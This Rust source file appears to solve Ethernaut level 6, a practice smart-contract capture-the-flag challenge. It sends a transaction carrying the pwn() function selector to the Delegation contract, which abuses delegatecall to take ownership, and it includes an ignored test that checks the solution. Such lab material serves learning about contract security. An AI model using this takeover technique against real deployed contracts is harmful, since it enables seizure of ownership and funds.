use async_trait::async_trait;
use ctf::*;
use ethers::prelude::*;
use ethers::providers::Middleware;
use ethers::utils::keccak256;

pub struct EthernautLevel6Solution;

#[async_trait]
impl Solution for EthernautLevel6Solution {
    type Level = EthernautLevel6;

    async fn solve(
        self,
        challenge: &Self::Level,
        offender: Actor,
    ) -> eyre::Result<()> {
        let tx = TransactionRequest::new()
            .to(challenge.delegation_address)
            .gas(U256::from(10_000_000))
            .data(keccak256("pwn()").into_iter().take(4).collect::<Vec<u8>>());

        offender.send_transaction(tx, None).await?.await?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[ignore]
    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        ctf::check_solution(EthernautLevel6Solution).await
    }
}
